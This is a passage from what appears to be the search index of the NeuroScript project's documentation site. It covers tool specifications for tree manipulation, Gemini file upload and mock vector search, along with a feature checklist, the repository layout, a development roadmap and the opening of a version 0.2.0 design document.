unique ID.</li> <li>Returns: A map representing the node.</li> </ul> </li> <li> <p>GetNodeByPath(tree_handle, path)</p> <ul> <li>Description: Retrieves a node using a dot-separated path from the root (e.g., <code>key.0.name</code>).</li> <li>Returns: A map representing the found node.</li> </ul> </li> <li> <p>GetParent(tree_handle, node_id)</p> <ul> <li>Description: Gets the parent of the specified node.</li> <li>Returns: A map representing the parent node, or <code>nil</code> if the node is the root.</li> </ul> </li> <li> <p>GetChildren(tree_handle, node_id)</p> <ul> <li>Description: Gets the children of an array node. Fails if the node is not of type <code>array</code>.</li> <li>Returns: A list of child node IDs.</li> </ul> </li> </ul>"},{"location":"ns/tools/trees_guide/#modification","title":"Modification","text":"<ul> <li> <p>AddChildNode(handle, parent_id, id_suggestion, type, value, key)</p> <ul> <li>Description: Adds a new node to a parent.</li> <li>Returns: The ID of the new node.</li> <li>Example: <code>let new_id = tool.Tree.AddChildNode(h, \"node-2\", \"user_profile\", \"object\", nil, \"profile\")</code></li> </ul> </li> <li> <p>RemoveNode(tree_handle, node_id)</p> <ul> <li>Description: Removes a node and all its descendants from the tree.</li> </ul> </li> <li> <p>SetValue(tree_handle, node_id, new_value)</p> <ul> <li>Description: Changes the <code>value</code> of a simple node (string, number, etc.). Cannot be used on <code>object</code> or <code>array</code> nodes.</li> </ul> </li> </ul>"},{"location":"ns/tools/trees_guide/#attributes-metadata","title":"Attributes &amp; Metadata","text":"<ul> <li> <p>SetObjectAttribute(handle, object_node_id, key, child_node_id)</p> <ul> <li>Description: Links an existing node as a child of an <code>object</code> node under a specific key. This is the primary way to build relationships.</li> </ul> </li> <li> <p>RemoveObjectAttribute(handle, object_node_id, key)</p> <ul> <li>Description: Unlinks a child from an <code>object</code> node but does not delete the child itself.</li> </ul> </li> <li> <p>SetNodeMetadata(handle, node_id, key, value)</p> <ul> <li>Description: Attaches a simple string key-value pair to any node's <code>attributes</code> map. This is for storing metadata (like status, comments, etc.) that isn't part of the core tree structure.</li> </ul> </li> <li> <p>GetNodeMetadata(handle, node_id)</p> <ul> <li>Description: Retrieves all attributes of a node, including structural links and metadata.</li> <li>Returns: A map of all attributes.</li> </ul> </li> <li> <p>RemoveNodeMetadata(handle, node_id, key)</p> <ul> <li>Description: Removes a single metadata key-value pair from a node.</li> </ul> </li> </ul>"},{"location":"ns/tools/trees_guide/#querying","title":"Querying","text":"<ul> <li>FindNodes(handle, start_node_id, query_map, max_depth, max_results)<ul> <li>Description: Finds all nodes descending from <code>start_node_id</code> that match the criteria in <code>query_map</code>.</li> <li>Returns: A list of matching node IDs.</li> <li>Example: <code>let files = tool.Tree.FindNodes(h, root_id, {\"type\": \"file\"}, -1, -1)</code></li> </ul> </li> </ul>"},{"location":"ns/tools/trees_guide/#4-practical-workflow-building-a-tree","title":"4. Practical Workflow: Building a Tree","text":"<p>You don't have to start with JSON. You can build a tree from scratch.</p> <p>```ns // 1. Start with an empty object as the root. let handle = tool.Tree.LoadJSON(\"{}\") let root_id = tool.Tree.GetRoot(handle).id</p> <p>// 2. Add a new node for a list of users. let users_list_id = tool.Tree.AddChildNode(handle, root_id, \"users\", \"array\", nil, \"users\")</p> <p>// 3. Add a user object to the users list. let user1_id = tool.Tree.AddChildNode(handle, users_list_id, \"user1\", \"object\", nil, \"\")</p> <p>// 4. Add name and email nodes for the new user. let name_id = tool.Tree.AddChildNode(handle, user1_id, \"\", \"string\", \"Alice\", \"name\") let email_id = tool.Tree.AddChildNode(handle, user1_id, \"\", \"string\", \"alice@example.com\", \"email\")</p> <p>// 5. Add some metadata to the user node. tool.Tree.SetNodeMetadata(handle, user1_id, \"status\", \"active\")</p> <p>// 6. View the result. print(tool.Tree.ToJSON(handle)) // Output will be: // { //   \"users\": [ //     { //       \"email\": \"alice@example.com\", //       \"name\": \"Alice\", //       \"status\": \"active\" //     } //   ] // }</p>"},{"location":"ns/tools/upload_file/","title":"upload_file","text":"<p>:: type: NSproject  :: subtype: tool_specification  :: version: 0.1.0  :: id: tool-spec-upload-file-v0.1  :: status: draft  :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_file_api.go  :: howToUpdate: Update if arguments, return value structure, or default display name logic changes.</p> <p># Tool Specification: TOOL.UploadFile (v0.1)</p> <ul> <li>Tool Name: TOOL.UploadFile (v0.1)</li> <li>Purpose: Uploads a local file from the NeuroScript sandbox environment to the Gemini File API storage. It waits for the file to become ACTIVE and ready for use in prompts.</li> <li>NeuroScript Syntax: <pre><code>uploadResultMap := TOOL.UploadFile(localFilePath, [optionalDisplayName])\n</code></pre></li> <li>Arguments:<ul> <li><code>local_path</code> (String): Required. The path to the file within the NeuroScript sandbox environment that needs to be uploaded. Subject to <code>SecureFilePath</code> validation.</li> <li><code>display_name</code> (String): Optional. A user-friendly name to assign to the file within the API. If omitted or null, defaults to the relative path of the file from the sandbox root (if a sandbox is set) or the file's base name otherwise.</li> </ul> </li> <li>Return Value: (Map)<ul> <li>On success: A map containing the details of the successfully uploaded and activated file. The structure matches the maps returned by <code>TOOL.ListAPIFiles</code>, including keys like <code>name</code>, <code>displayName</code>, <code>uri</code>, <code>mimeType</code>, <code>sizeBytes</code>, <code>state</code> (which will be \"ACTIVE\"), etc.</li> <li>On failure: An error (e.g., local file not found, upload API error, timeout waiting for ACTIVE state, security violation). A Go-level error will also be returned to the interpreter.</li> </ul> </li> <li>Behavior:<ol> <li>Checks if the internal GenAI client is initialized. Returns an error if not.</li> <li>Validates the <code>local_path</code> argument (must be a non-empty string) and performs <code>SecureFilePath</code> check against the interpreter's sandbox directory.</li> <li>Determines the <code>displayName</code> to use (provided argument or default based on path).</li> <li>Checks if the local file exists and gets its size. Handles zero-byte files by uploading minimal placeholder content (\" \").</li> <li>Determines the MIME type based on the file extension, defaulting to <code>application/octet-stream</code>.</li> <li>Calls the Gemini File API's <code>UploadFile</code> endpoint with the file content and determined options.</li> <li>Polls the API using <code>GetFile</code> until the uploaded file's state becomes <code>ACTIVE</code>.</li> <li>If the file becomes <code>ACTIVE</code> within the timeout period, returns a map containing the final file metadata.</li> <li>If the file fails to become <code>ACTIVE</code> (e.g., enters a <code>FAILED</code> state or times out), attempts to delete the failed upload from the API and returns an error.</li> </ol> </li> <li>Security Considerations:<ul> <li>Requires a valid <code>GEMINI_API_KEY</code> with permission to upload files.</li> <li><code>local_path</code> is validated using <code>SecureFilePath</code> to ensure it's within the allowed sandbox directory.</li> <li>Network access to Google Cloud services is required.</li> <li>The content of the uploaded file is transferred to Google Cloud storage.</li> </ul> </li> <li>Examples: <pre><code>// Upload a file using default display name\nresult1 := TOOL.UploadFile(\"data/input.txt\")\nIF result1[\"error\"] != null THEN\n    IO.Print(\"Error uploading input.txt:\", result1[\"error\"])\nELSE\n    IO.Print(\"Uploaded input.txt successfully. API Name:\", result1[\"name\"])\n    // Can now potentially use result1[\"uri\"] in prompts\nEND\n\n// Upload a file with a specific display name\nresult2 := TOOL.UploadFile(\"images/logo.png\", \"ProjectLogo\")\nIF result2[\"error\"] != null THEN\n    IO.Print(\"Error uploading logo.png:\", result2[\"error\"])\nELSE\n    IO.Print(\"Uploaded logo.png successfully. API Name:\", result2[\"name\"], \", URI:\", result2[\"uri\"])\nEND\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Implemented in <code>pkg/core/tools_file_api.go</code> as <code>toolUploadFile</code>.</li> <li>Uses <code>interpreter.GenAIClient().UploadFile()</code> and <code>interpreter.GenAIClient().GetFile()</code>.</li> <li>Logic adapted from <code>cmd/gensync/helpers.go</code>.</li> <li>Requires careful handling of file reading, zero-byte files, MIME types, and polling logic.</li> <li>Registered via <code>registerFileAPITools</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/vector_searchskills/","title":"vector_searchskills","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-vector-searchskills-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_vector.go, docs/script_spec.md :: relatedTo: Vector.VectorUpdate :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/vector_searchskills/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/vector_searchskills/#tool-specification-vectorsearchskills-v01","title":"Tool Specification: <code>Vector.SearchSkills</code> (v0.1)","text":"<ul> <li>Tool Name: <code>Vector.SearchSkills</code> (v0.1)</li> <li>Purpose: Performs a similarity search against a (mock) vector index of indexed skill files. It takes a natural language query, generates an embedding for it, compares it to stored embeddings, and returns a ranked list of matching skill files based on cosine similarity.</li> <li>NeuroScript Syntax: <code>CALL Vector.SearchSkills(query: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>query</code> (String): Required. The natural language text query used to find relevant skills.</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success: A JSON-formatted string representing a list of matching skills. (Accessible via <code>LAST</code> after the <code>CALL</code>).<ul> <li>Each item in the list is an object (Map) with two keys:<ul> <li><code>path</code> (String): The relative path (within the sandbox) of the skill file that matched.</li> <li><code>score</code> (Number): The cosine similarity score between the query and the skill file (typically between 0.0 and 1.0, higher means more similar).</li> </ul> </li> <li>The list is sorted in descending order by <code>score</code>.</li> <li>Returns an empty JSON list (<code>\"[]\"</code>) if no skills meet the similarity threshold (currently 0.5 in the implementation).</li> </ul> </li> <li>On failure (e.g., error generating query embedding): Returns an error message string (e.g., \"SearchSkills embedding generation failed: ...\"). Internal errors (like JSON marshalling) might cause a script execution error. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>query</code>) of type String is provided.</li> <li>Initializes the interpreter's internal <code>vectorIndex</code> (a map of absolute file paths to embeddings) if it's not already initialized.</li> <li>Calls the interpreter's <code>GenerateEmbedding</code> function to get a vector embedding for the input <code>query</code>. If this fails, returns an error message string.</li> <li>Iterates through each entry (absolute path -&gt; stored embedding) in the <code>vectorIndex</code>.</li> <li>Calculates the cosine similarity score between the query embedding and the stored embedding. Skips the entry if calculation fails.</li> <li>If the calculated score meets or exceeds a predefined threshold (0.5), it proceeds.</li> <li>Converts the absolute path (from the index key) back to a relative path based on the interpreter's <code>sandboxDir</code>.</li> <li>Creates a result Map: <code>{\"path\": relative_path, \"score\": score}</code>.</li> <li>Appends this Map to a list of results.</li> <li>After checking all entries, sorts the list of result Maps in descending order based on the <code>score</code>.</li> <li>Marshals the sorted list into a JSON string. If marshalling fails, an internal error occurs.</li> <li>Returns the JSON string representing the sorted list of results.</li> </ol> </li> <li>Security Considerations:<ul> <li>Relies on <code>interpreter.GenerateEmbedding</code>, which typically involves sending the query text to an external service (like an LLM API). Consider the privacy implications of the query content being sent externally.</li> <li>The tool itself reads from an in-memory index (<code>interpreter.vectorIndex</code>) and does not directly perform file I/O during the search operation.</li> <li>The conversion from absolute paths (stored in the index) back to relative paths depends on the correct configuration of the interpreter's <code>sandboxDir</code>.</li> </ul> </li> <li>Examples: <pre><code># Prerequisite: Assume VectorUpdate has been called previously for some files\n# CALL Vector.VectorUpdate(\"library/math_helpers.ns.txt\")\n# CALL Vector.VectorUpdate(\"library/string_utils.ns.txt\")\n\n# Example 1: Search for math-related skills\nSET search_query = \"How do I add two numbers?\"\nCALL Vector.SearchSkills(search_query)\nSET search_results_json = LAST\n\nEMIT \"Search Results for '\" + search_query + \"':\"\nEMIT search_results_json\n# Example Output (JSON string): \"[{\\\"path\\\":\\\"library/math_helpers.ns.txt\\\",\\\"score\\\":0.82}]\"\n# Note: Actual score and results depend heavily on the embedding model and indexed content.\n\n# Example 2: Search for something unlikely to match\nCALL Vector.SearchSkills(\"Tell me about ancient history\")\nSET no_match_json = LAST\nEMIT \"Search results for unlikely query: \" + no_match_json # Expect \"[]\"\n\n# Example 3: (Illustrative) Process results if JSON parsing were available\n# SET results_list = JSON.Parse(search_results_json) # Assumes JSON.Parse tool\n# IF List.Length(results_list) &gt; 0 THEN\n#   SET top_result = results_list[0]\n#   EMIT \"Top result path: \" + top_result[\"path\"] + \" with score: \" + top_result[\"score\"]\n# ELSE\n#   EMIT \"No relevant skills found.\"\n# ENDBLOCK\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_vector.go</code></li> <li>Function: <code>toolSearchSkills</code></li> <li>Spec Name: <code>SearchSkills</code></li> <li>Key Go Packages: <code>encoding/json</code>, <code>fmt</code>, <code>path/filepath</code>, <code>sort</code></li> <li>Relies heavily on <code>interpreter.GenerateEmbedding</code> (external call likely) and <code>interpreter.vectorIndex</code> (internal state). Also uses an internal <code>cosineSimilarity</code> helper.</li> <li>Registration: Registered by <code>registerVectorTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>string, error</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/vector_update/","title":"vector_update","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-vector-vectorupdate-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_vector.go, docs/script_spec.md :: relatedTo: Vector.SearchSkills :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/vector_update/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/vector_update/#tool-specification-vectorvectorupdate-v01","title":"Tool Specification: <code>Vector.VectorUpdate</code> (v0.1)","text":"<ul> <li>Tool Name: <code>Vector.VectorUpdate</code> (v0.1)</li> <li>Purpose: Reads the content of a specified file (presumably a skill file) within the sandbox, generates a vector embedding for that content, and then adds or updates this embedding in the interpreter's internal (mock) vector index. This makes the file discoverable via <code>Vector.SearchSkills</code>.</li> <li>NeuroScript Syntax: <code>CALL Vector.VectorUpdate(filepath: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>filepath</code> (String): Required. The relative path (within the sandbox) of the file whose content should be indexed.</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success: Returns the literal string <code>\"OK\"</code>. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>On error (e.g., path validation fails, file read error, embedding generation fails): Returns an error message string describing the failure. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>filepath</code>) of type String is provided.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Uses <code>SecureFilePath</code> to validate the <code>filepath</code> argument against the <code>sandboxDir</code>. If validation fails, returns an error message string.</li> <li>Reads the entire content of the file at the validated absolute path using <code>os.ReadFile</code>. If reading fails, returns an error message string.</li> <li>Calls the interpreter's <code>GenerateEmbedding</code> function to get a vector embedding for the file's content string. If this fails, returns an error message string.</li> <li>Initializes the interpreter's internal <code>vectorIndex</code> (a map of absolute file paths to embeddings) if it's not already initialized.</li> <li>Stores the generated embedding in the <code>vectorIndex</code> map, using the absolute path of the file as the key. If an entry for this absolute path already exists, it is overwritten with the new embedding.</li> <li>Returns the string <code>\"OK\"</code> to indicate successful indexing/updating.</li> </ol> </li> <li>Security Considerations:<ul> <li>Uses <code>SecureFilePath</code> to ensure the file being read and indexed is within the sandbox.</li> <li>Relies on <code>interpreter.GenerateEmbedding</code>, which typically involves sending the entire file content to an external service (like an LLM API). This has significant privacy implications depending on the file content and the embedding service used. Ensure the embedding provider's privacy policy is acceptable.</li> <li>Modifies the interpreter's internal state (<code>vectorIndex</code>).</li> </ul> </li> <li>Examples: <pre><code># Example 1: Index a newly created skill file\nSET skill_content = \"\"\"\nDEFINE PROCEDURE CalculateArea(width, height)\nCOMMENT:\n    PURPOSE: Calculates the area of a rectangle.\n    INPUTS: - width: number\n            - height: number\n    OUTPUT: number (the calculated area)\n    ALGORITHM: Multiply width by height.\nENDCOMMENT\n# SET area = width * height # Requires Math tool\n# RETURN area\nRETURN \"Calculation placeholder\" # Placeholder\nEND\n\"\"\"\nCALL FS.WriteFile(\"library/geometry/area.ns.txt\", skill_content)\nSET write_status = LAST\n\nIF write_status == \"OK\" THEN\n  EMIT \"Indexing skill file: library/geometry/area.ns.txt\"\n  CALL Vector.VectorUpdate(\"library/geometry/area.ns.txt\")\n  SET index_status = LAST\n  EMIT \"Indexing status: \" + index_status # Expect \"OK\"\nELSE\n  EMIT \"Failed to write skill file, cannot index.\"\nENDBLOCK\n\n# Example 2: Attempt to index a non-existent file\nCALL Vector.VectorUpdate(\"non_existent_skill.ns.txt\")\nSET non_exist_status = LAST\nIF non_exist_status != \"OK\" THEN\n  EMIT \"Indexing failed for non-existent file as expected: \" + non_exist_status\nELSE\n  EMIT \"Indexing unexpectedly succeeded for non-existent file.\"\nENDBLOCK\n\n# Example 3: Search after indexing (using example from SearchSkills)\nCALL Vector.SearchSkills(\"calculate rectangle area\")\nSET search_results_json = LAST\nEMIT \"Search results after indexing: \" + search_results_json\n# Should hopefully now include 'library/geometry/area.ns.txt' if embedding works well\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_vector.go</code></li> <li>Function: <code>toolVectorUpdate</code></li> <li>Spec Name: <code>VectorUpdate</code></li> <li>Key Go Packages: <code>fmt</code>, <code>os</code>, <code>path/filepath</code></li> <li>Relies heavily on <code>interpreter.GenerateEmbedding</code> (external call likely) and modifies <code>interpreter.vectorIndex</code> (internal state). Uses <code>core.SecureFilePath</code>.</li> <li>Registration: Registered by <code>registerVectorTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>string, error</code>.</li> </ul> </li> </ul>"},{"location":"project/completed/","title":"Completed","text":""},{"location":"project/completed/#d-completed-features","title":"D. Completed Features","text":"<p>[x] neurogo able to execute basic ns (SET, CALL, RETURN, basic IF/WHILE/FOR headers and block execution) interpreter_simple_steps.go [x] Basic Arithmetic Evaluation (+, -, , /, %, , unary -) evaluation_operators.go [x] Basic Condition Evaluation (==, !=, &gt;, &lt;, &gt;=, &lt;=, NOT, AND, OR, truthiness) evaluation_logic.go [x] List ([]) and Map ({}) Literal Parsing &amp; Evaluation evaluation_main.go [x] List/Map Element Access (e.g., list[index], map[\"key\"]) evaluation_access.go [x] FOR EACH List Element Iteration interpreter_control_flow.go [x] FOR EACH Map Key Iteration interpreter_control_flow.go [x] FOR EACH String Character/Comma Iteration interpreter_control_flow.go [x] ELSE Block Execution interpreter_control_flow.go [x] Basic set of golang tools in neurogo (FS, Git, Mock Vector, Strings, Shell, Go fmt/build/test/check/mod, Metadata, Checklist, Blocks, Math, Lists) tools_list_register.go [x] In-memory vector DB implemented (mocked, VectorUpdate, SearchSkills) embeddings.go [x] LLM Integration via CALL LLM (Gemini) interpreter_simple_steps.go [x] Basic CLI Runner (neurogo) with debug flags config.go [x] neurogo skips loading ns files with errors gracefully parser_api.go [x] ns stored in git (manually, but tools support adding/committing) orchestrator.ns.txt [x] Bootstrap Skills: Create initial .ns.txt skills (HandleSkillRequest, CommitChanges, UpdateNsSyntax, etc.) UpdateNsSyntax.ns.txt (Note: CommitChanges likely superseded by TOOL.GitCommit) [x] Basic Core Syntax Parsing (DEFINE PROCEDURE, COMMENT:, SET, CALL, RETURN, END) neuroscript_parser.go [x] Structured Docstring Parsing (COMMENT: block content parsed into struct, includes LANG_VERSION) utils.go [x] Block Header Parsing (IF...THEN, WHILE...DO, FOR EACH...DO) neuroscript_parser.go [x] Block Termination Parsing (ENDBLOCK) neuroscript_parser.go [x] Line Continuation Parsing (Supported via \\ in SET prompt example) modify_and_build.ns.txt (Partially done) [x] Basic Expression Evaluation (String/Num/Bool Literals, Variables, LAST, Parentheses) evaluation_test.go [x] EVAL() Function Parsing &amp; Evaluation (Explicit Placeholder Resolution) evaluation_resolve.go [x] List ([]) and Map ({}) Literal Parsing &amp; Evaluation evaluation_main.go [x] List/Map Element Access (list[index], map[\"key\"]) evaluation_access.go [x] Basic Arithmetic Evaluation (+, -, , /, %, , unary -) evaluation_operators.go [x] String Concatenation (+) evaluation_operators.go [x] Logical Operators (AND, OR, NOT - includes short-circuiting) evaluation_logical_bitwise_test.go [x] Bitwise Operators (&amp;, |, ^, ~) evaluation_operators.go [x] Built-in Math Functions (LN, LOG, SIN, COS, TAN, ASIN, ACOS, ATAN) evaluations_functions_test.go [x] Operator Precedence Handling (via Grammar/AST) ast_builder_operators.go [x] Basic Interpreter Structure (Interpreter, Scope, RunProcedure) interpreter.go [x] Interpreter Block Execution (IF/ELSE/WHILE/FOR, RETURN propagation) interpreter_control_flow.go [x] Interpreter: Implement FOR EACH List Element Iteration interpreter_control_flow.go [x] Interpreter: Implement FOR EACH Map Key Iteration interpreter_control_flow.go [x] Interpreter: Implement FOR EACH String Character/Comma Iteration interpreter_control_flow.go [x] CALL LLM Integration (via llm.go) interpreter_simple_steps.go [x] CALL TOOL Mechanism &amp; Argument Validation/Conversion interpreter_simple_steps.go [x] CALL TOOL requires <code>TOOL.</code> prefix for built-ins interpreter_test.go [x] File Version Declaration Parsing (FILE_VERSION) ast_builder_main.go [x] Basic FS Tools Implemented (ReadFile, WriteFile, ListDirectory, LineCountFile, SanitizeFilename) tools_fs.go [x] Basic Git Tools Implemented (GitAdd, GitCommit) tools_git.go [x] String Tools Implemented (StringLength, Substring, ToUpper, ToLower, TrimSpace, SplitString, SplitWords, JoinStrings, ReplaceAll, Contains, HasPrefix, HasSuffix, LineCountString) tools_string.go [x] Shell/Go Tools Implemented (ExecuteCommand, GoBuild, GoCheck, GoTest, GoFmt, GoModTidy) tools_shell.go [x] Mock Vector DB Tools (VectorUpdate, SearchSkills) embeddings.go [x] Basic CLI Runner (neurogo) app.go [x] Debug Flags and Conditional Logging in neurogo config.go [x] Graceful skipping of files with parse errors in neurogo parser_api.go [x] Fenced Code Block Extraction (including metadata) blocks_tool.go [x] Updated neurogo CLI args (-lib flag, proc/file target, agent mode flags) config.go [x] Metadata Extraction Tool (TOOL.ExtractMetadata) tools_metadata.go [x] Checklist Parser (String manipulation based) scanner_parser.go [x] Checklist Parser Tool (TOOL.ParseChecklistFromString) checklist_tool.go [x] NeuroData Block Parsing (Blocks tool) blocks_tool.go [x] Agent Mode Framework (Conversation, Security Layer, LLM Client, Tool Declarations) llm_tools.go [x] Allowlist/Denylist Loading and Enforcement in Agent Mode security.go [x] Basic Path Sandboxing (via SecureFilePath) security.go [x] Basic List Tools (ListLength, ListIsEmpty) tools_list_impl.go [x] Review versioning: Moved language version into docstring block (<code>LANG_VERSION:</code>) and clarified <code>FILE_VERSION</code> vs <code>:: version:</code> usage. metadata.md [x] Only load skills when requested (Implicitly true as they are loaded from files on demand or via lib path scan) [x] More tests for securefile root tools_fs_list_test.go [x] Allow LLM to use local tools back (Implemented via Agent Mode) security.go [x] Eval tool for arith etc (Arithmetic implemented as operators, not standalone EVAL tool for just math) [x] Files LLM allowed to see (Handled by Sandbox + Allowlist) config.go [x] LLM selection (Via SetModel method, default model constant) llm.go [x] neurogo as local agent for LLM app_agent.go [x] Restricted mode design exists restricted_mode.md (Marked as design exists) [x] Tools: Implement Real In-Memory Vector DB (Functional mock exists) embeddings.go [x] LLM Gateway: Make LLM endpoint/model configurable (Client supports SetModel, default constant exists) llm.go [x] Basic Math Tools (TOOL.Add, Subtract, Multiply, Divide, Modulo) tools_math.go [x] NeuroData Checklist Parser (String Manipulation) scanner_parser.go [x] Defined Errors for Checklist Parser (ErrMalformedItem, ErrNoContent) defined_errors.go [x] Tool for Checklist Parsing (TOOL.ParseChecklistFromString) checklist_tool.go [x] Updated test error checking to use <code>errors.Is</code> vs <code>errorContains</code> appropriately interpreter_test.go</p>"},{"location":"project/repo_site_structure/","title":"How the NS repo and Site are structured","text":""},{"location":"project/repo_site_structure/#repo-dirs","title":"Repo Dirs","text":"<ol> <li><code>/pkg</code> contains the shared source code of NS</li> <li><code>/cmd</code> contains source code for various cli tools</li> <li><code>/bin</code> is currently unused</li> <li><code>/docs</code> contains most of the md documentation files</li> <li><code>/project</code> contains operational files for running the ns project</li> <li><code>/site</code> is the documentation generated by mkdocs from docs</li> <li><code>/library</code> contains ns and nd files to do useful things</li> </ol>"},{"location":"project/repo_site_structure/#some-root-files","title":"Some root files","text":"<ol> <li><code>/index.html</code> is the website landing page</li> <li><code>/README.md</code> is front page matter for the github repo</li> <li><code>/AI_README.md</code> contains instructions for AIs working on the project</li> </ol>"},{"location":"project/repo_site_structure/#mkdocs","title":"mkdocs","text":"<p>We use mkdocs to generate the technical documentation. This should be run with <code>mkdocs build</code> from root, it will erase and rebuild /site/...</p> <p><code>.github/workflows/deploy.yml</code> should trigger do this automatically on github and send the results to the <code>gh-pages</code> branch.</p>"},{"location":"project/Version_01/road_to_01/","title":"NeuroScript Development Roadmap","text":"<p>Version: 0.1.0 DependsOn: docs/development checklist.md HowToUpdate: Review the \"Planned Features\" in the checklist and synthesize major goals into phases here. Ensure alignment with the overall project goal.</p> <p>This roadmap outlines the high-level goals for NeuroScript development, driving the priorities in the <code>development checklist.md</code>.</p>"},{"location":"project/Version_01/road_to_01/#overall-goal","title":"Overall Goal","text":"<p>Achieve Bootstrapping: Enable NeuroScript, executed by either the <code>neurogo</code> interpreter or an LLM, to manage its own development lifecycle. This includes using NeuroScript procedures (<code>.ns.txt</code> files) combined with <code>CALL LLM</code> and <code>CALL TOOL.*</code> to: * Find relevant skills (via Vector DB search). * Generate new NeuroScript code for skills or refactoring. * Check syntax and format NeuroScript code. * Manage skills within a Git repository (add, commit, branch). * Potentially build and test associated Go code (<code>neurogo</code> itself or tools).</p>"},{"location":"project/Version_01/road_to_01/#development-phases","title":"Development Phases","text":""},{"location":"project/Version_01/road_to_01/#phase-1-core-interpreter-language-foundations-near-term-focus","title":"Phase 1: Core Interpreter &amp; Language Foundations (Near-Term Focus)","text":"<ul> <li>Goal: Solidify the core NeuroScript language execution capabilities needed for complex, self-managing scripts.</li> <li>Key Targets:<ul> <li>Implement robust LLM context management (<code>CALL LLM</code>).</li> <li>Introduce NeuroScript-specific error handling (e.g., TRY/CATCH).</li> <li>Design and implement the <code>NeuroData</code> concept for structured data handling within scripts.</li> <li>Refine list/map operations if needed beyond basic access/iteration.</li> </ul> </li> </ul>"},{"location":"project/Version_01/road_to_01/#phase-2-tooling-for-self-management-bootstrapping","title":"Phase 2: Tooling for Self-Management &amp; Bootstrapping","text":"<ul> <li>Goal: Build and refine the specific <code>TOOL.*</code> functions essential for NeuroScript to manage its own ecosystem.</li> <li>Key Targets:<ul> <li>Replace mock Vector DB with a real implementation (<code>TOOL.VectorUpdate</code>, <code>TOOL.SearchSkills</code>).</li> <li>Enhance Git tooling (<code>TOOL.GitAdd</code>, <code>TOOL.GitCommit</code>) with branching, status checks, pulling, and auto-indexing capabilities.</li> <li>Create <code>TOOL.NeuroScriptCheckSyntax</code> for validating script content programmatically.</li> <li>Develop <code>nsfmt</code> (either as a tool or a standard NeuroScript procedure) for code formatting.</li> <li>Finalize versioning conventions (<code>FILE_VERSION</code>, <code>LANG_VERSION</code>) and potentially automate updates via tooling.</li> <li>Embed core utility NeuroScripts (like <code>CommitChanges</code>) into the <code>neurogo</code> binary.</li> </ul> </li> </ul>"},{"location":"project/Version_01/road_to_01/#phase-3-ecosystem-expansion-general-tooling","title":"Phase 3: Ecosystem Expansion &amp; General Tooling","text":"<ul> <li>Goal: Broaden NeuroScript's applicability by adding more general-purpose tools and integrations.</li> <li>Key Targets:<ul> <li>Add common utility tools (JSON parsing/manipulation, HTTP requests).</li> <li>Implement Markdown reading/writing tools.</li> <li>Develop tools for interacting with structured documents (e.g., hierarchical data).</li> <li>Add table manipulation tools.</li> <li>Explore integration with external services (e.g., Google Sheets, Google Docs).</li> </ul> </li> </ul>"},{"location":"project/Version_01/road_to_01/#phase-4-advanced-features-long-term-vision","title":"Phase 4: Advanced Features &amp; Long-Term Vision","text":"<ul> <li>Goal: Explore more advanced language features and capabilities.</li> <li>Key Targets:<ul> <li>Implement self-testing features within NeuroScript.</li> <li>Enhance list manipulation capabilities.</li> <li>Investigate Prolog-style logic programming features.</li> <li>Add support for generating/manipulating other formats (e.g., SVG).</li> <li>Refine LLM interaction (e.g., patch application, armored data passing).</li> <li>Multi-Context Prompting (MCP) support.</li> </ul> </li> </ul>"},{"location":"project/Version_02/design_map/","title":"Design map","text":"<p># NeuroScript Version 0.2.0 Design Document</p> <p>## Introduction</p> <p>NeuroScript aims to be a structured, human-readable language facilitating communication and task execution between humans, AI agents, and computer systems. It provides a procedural scaffolding for defining reusable skills, particularly enabling Large Language Models (LLMs) to leverage explicit, step-by-step reasoning rather than relying solely on implicit chain-of-thought[cite: 2]. This version (0.2.0) introduces significant refinements focused on improving readability, explicitness, and reinforcing the core communication goals based on developer feedback and practical usage patterns observed in early examples.</p> <p>## High-Level Design &amp; Execution Model</p> <p>### Core Goals (Reinforced in v0.2.0)</p> <ol> <li>Explicit Reasoning: Encourage clear, step-by-step logic in a code-like format[cite: 2].</li> <li>Reusable Skills: Define procedures (<code>func</code>) that can be stored, discovered, and reused[cite: 2].</li> <li>Self-Documenting: Emphasize structured metadata (<code>::</code>) for clarity on purpose, interface, logic, and versioning[cite: 2].</li> <li>Explicit Actor Interaction: Clearly distinguish interactions targeting AI, Humans, or Computer systems within the script syntax.</li> <li>Structured Data: Continue support for list (<code>[]</code>) and map (<code>{}</code>) literals[cite: 2].</li> <li>Versioning: Maintain <code>file_version</code> at the file level and <code>lang_version</code> within procedure metadata for tracking[cite: 2].</li> <li>Simplicity (One Way): Where practical, strive for only one clear way to accomplish a specific language task, similar to Go's philosophy [personalization: reflecting your Go background and preference].</li> </ol> <p>### Execution Model</p> <p>NeuroScript execution revolves around the <code>neurogo</code> (<code>ng</code>) interpreter, implemented in Go [personalization: referencing your implementation language]. This interpreter is the ground truth for script execution.</p> <ol> <li>Primary Executor (<code>ng</code>): The Go interpreter parses and executes scripts step-by-step, managing state and reliably interacting with external systems via defined interfaces 